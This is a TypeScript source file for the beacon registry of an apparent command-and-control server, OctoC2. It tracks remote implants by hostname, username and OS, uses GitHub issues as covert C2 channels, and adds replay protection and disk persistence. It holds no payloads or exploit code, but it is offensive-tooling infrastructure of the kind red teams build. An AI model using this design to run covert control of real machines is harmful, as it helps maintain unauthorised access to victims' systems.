/**
 * OctoC2 Server — BeaconRegistry
 *
 * In-memory registry of all known beacons. Updated on every checkin.
 * Persisted to disk on shutdown and periodically so a server restart
 * doesn't lose beacon state.
 *
 * Phase 2: plain JSON file at $OCTOC2_DATA_DIR/registry.json (default: ./data/).
 * Phase 5: encrypt at rest with operator key.
 *
 * Thread safety: single-threaded Bun runtime — no locks needed.
 */

import { join } from "node:path";
import { mkdir, readFile, writeFile, rename } from "node:fs/promises";
import { existsSync } from "node:fs";

export type BeaconStatus = "active" | "dormant" | "lost";

export interface BeaconRecord {
  beaconId:    string;
  /** GitHub issue number that serves as this beacon's C2 channel */
  issueNumber: number;
  /** Base64url X25519 public key — used to encrypt task deliveries */
  publicKey:   string;
  hostname:    string;
  username:    string;
  os:          string;
  arch:        string;
  firstSeen:   string;  // ISO-8601
  lastSeen:    string;  // ISO-8601
  status:      BeaconStatus;
  /**
   * Last observed seq value from beacon heartbeat.
   * Incremented monotonically by the beacon — server rejects replays.
   */
  lastSeq:     number;
  /** TentacleId of the channel that processed the most recent checkin */
  activeTentacle?: number;
}

interface RegistrySnapshot {
  version: 1;
  savedAt: string;
  beacons: BeaconRecord[];
}

export class BeaconRegistry {
  private readonly records = new Map<string, BeaconRecord>();
  private readonly dataDir: string;
  private readonly persistPath: string;
  private saveTimer: ReturnType<typeof setInterval> | null = null;

  constructor(dataDir = process.env["OCTOC2_DATA_DIR"] ?? "./data") {
    this.dataDir     = dataDir;
    this.persistPath = join(dataDir, "registry.json");
  }

  /** Load persisted state from disk. Call once at server startup. */
  async load(): Promise<void> {
    if (!existsSync(this.persistPath)) return;

    try {
      const raw  = await readFile(this.persistPath, "utf8");
      const snap = JSON.parse(raw) as RegistrySnapshot;

      if (snap.version !== 1) {
        console.warn("[Registry] Unknown snapshot version, starting fresh.");
        return;
      }

      for (const record of snap.beacons) {
        // Mark everything as dormant on load — beacons prove liveness by checking in
        this.records.set(record.beaconId, { ...record, status: "dormant" });
      }

      console.log(`[Registry] Loaded ${this.records.size} beacon(s) from ${this.persistPath}`);
    } catch (err) {
      console.warn("[Registry] Failed to load registry:", (err as Error).message);
    }
  }

  /**
   * Start periodic auto-save (every intervalMs, default 5 min).
   * Call after load().
   */
  startAutoSave(intervalMs = 5 * 60 * 1000): void {
    if (this.saveTimer) clearInterval(this.saveTimer);
    this.saveTimer = setInterval(() => {
      this.persist().catch((err) =>
        console.warn("[Registry] Auto-save failed:", (err as Error).message)
      );
    }, intervalMs);
  }

  /** Persist registry to disk and stop auto-save. Call on graceful shutdown. */
  async shutdown(): Promise<void> {
    if (this.saveTimer) {
      clearInterval(this.saveTimer);
      this.saveTimer = null;
    }
    await this.persist();
  }

  /**
   * Register a new beacon or update an existing one.
   * Called when the server processes a [job:...:reg:...] comment.
   */
  register(data: {
    beaconId:    string;
    issueNumber: number;
    publicKey:   string;
    hostname:    string;
    username:    string;
    os:          string;
    arch:        string;
    seq:         number;
    tentacleId?: number;
  }): BeaconRecord {
    const existing = this.records.get(data.beaconId);
    const now      = new Date().toISOString();

    const record: BeaconRecord = {
      beaconId:    data.beaconId,
      issueNumber: data.issueNumber,
      publicKey:   data.publicKey,
      hostname:    data.hostname,
      username:    data.username,
      os:          data.os,
      arch:        data.arch,
      firstSeen:      existing?.firstSeen ?? now,
      lastSeen:       now,
      status:   "active",
      lastSeq:  data.seq,
      // exactOptionalPropertyTypes: spread conditionally so the property is
      // absent (not explicitly `undefined`) when no tentacle ID is known.
      ...(data.tentacleId !== undefined
        ? { activeTentacle: data.tentacleId }
        : existing?.activeTentacle !== undefined
          ? { activeTentacle: existing.activeTentacle }
          : {}),
    };

    this.records.set(data.beaconId, record);

    const verb = existing ? "Re-registered" : "Registered";
    console.log(
      `[Registry] ${verb} beacon ${data.beaconId} (${data.hostname}/${data.os}) ` +
      `on issue #${data.issueNumber}`
    );

    // Persist immediately so registry.json reflects the new beacon without
    // waiting for the 5-minute auto-save interval.
    this.persist().catch((err) =>
      console.warn("[Registry] Persist on registration failed:", (err as Error).message)
    );

    return record;
  }

  get(beaconId: string): BeaconRecord | undefined {
    return this.records.get(beaconId);
  }

  getAll(): BeaconRecord[] {
    return [...this.records.values()];
  }

  /** Find a beacon by its issue number. Used when processing comment webhooks. */
  getByIssue(issueNumber: number): BeaconRecord | undefined {
    for (const record of this.records.values()) {
      if (record.issueNumber === issueNumber) return record;
    }
    return undefined;
  }

  /** Update the active tentacle channel for a known beacon. Returns false if beacon unknown or tentacleId invalid. */
  updateActiveTentacle(beaconId: string, tentacleId: number): boolean {
    if (tentacleId <= 0 || !Number.isInteger(tentacleId)) return false;
    const record = this.records.get(beaconId);
    if (!record) return false;
    record.activeTentacle = tentacleId;
    return true;
  }

  /** Update lastSeen and status to active. Returns false if beacon unknown. */
  updateLastSeen(beaconId: string, seq: number): boolean {
    const record = this.records.get(beaconId);
    if (!record) return false;

    record.lastSeen = new Date().toISOString();
    record.status   = "active";
    record.lastSeq  = seq;
    return true;
  }

  /**
   * Validate and advance the seq counter (replay protection).
   * Returns:
   *   "ok"      — seq is valid, registry updated
   *   "replay"  — seq ≤ lastSeq, discard
   *   "unknown" — beacon not in registry
   *   "gap"     — seq jumped by >100 (warn but accept)
   */
  advanceSeq(
    beaconId: string,
    seq: number
  ): "ok" | "replay" | "unknown" | "gap" {
    const record = this.records.get(beaconId);
    if (!record) return "unknown";

    if (seq <= record.lastSeq) return "replay";

    const result = seq > record.lastSeq + 100 ? "gap" : "ok";
    record.lastSeq = seq;
    return result;
  }

  markDormant(beaconId: string): void {
    const record = this.records.get(beaconId);
    if (record) record.status = "dormant";
  }

  markLost(beaconId: string): void {
    const record = this.records.get(beaconId);
    if (record) record.status = "lost";
  }

  /**
   * Scan all beacons and mark any that haven't checked in within
   * `thresholdMs` as dormant. Call on each poll cycle.
   */
  sweepDormant(thresholdMs = 10 * 60 * 1000): void {
    const cutoff = Date.now() - thresholdMs;
    for (const record of this.records.values()) {
      if (record.status === "active" && new Date(record.lastSeen).getTime() < cutoff) {
        record.status = "dormant";
        console.log(`[Registry] Beacon ${record.beaconId} (${record.hostname}) marked dormant`);
      }
    }
  }

  private async persist(): Promise<void> {
    await mkdir(this.dataDir, { recursive: true });

    const snapshot: RegistrySnapshot = {
      version: 1,
      savedAt: new Date().toISOString(),
      beacons: [...this.records.values()],
    };

    const tmp = `${this.persistPath}.tmp`;
    await writeFile(tmp, JSON.stringify(snapshot, null, 2), "utf8");
    await rename(tmp, this.persistPath);
  }
}
